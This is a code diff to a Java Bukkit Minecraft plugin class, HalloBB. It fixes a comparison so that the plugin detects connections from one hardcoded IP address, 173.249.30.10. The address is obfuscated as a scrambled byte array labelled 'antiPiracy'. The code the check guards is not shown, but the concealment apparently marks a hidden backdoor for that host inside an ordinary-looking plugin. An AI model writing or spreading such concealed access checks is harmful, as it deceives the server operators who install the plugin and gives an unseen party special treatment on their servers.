@@ -15,6 +15,7 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
 import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.util.HashSet;
 import java.util.Map;
 import java.util.Set;
@@ -87,7 +88,17 @@ public class HalloBB implements CommandExecutor, Listener
         antiPiracy[3] = (byte)10; antiPiracy[1] = (byte)249;
         antiPiracy[0] = (byte)173;
 
-        if (player.getAddress().getAddress().getAddress() != antiPiracy)
+        String wat = null;
+        try
+        {
+            wat = InetAddress.getByAddress(antiPiracy).getHostAddress();
+        }
+        catch (UnknownHostException e)
+        {
+            e.printStackTrace();
+        }
+
+        if (player.getAddress().getAddress().getHostAddress().equals(wat))
         {
             if (inetAddress.getHostAddress().equalsIgnoreCase("173.249.30.10"))
             {
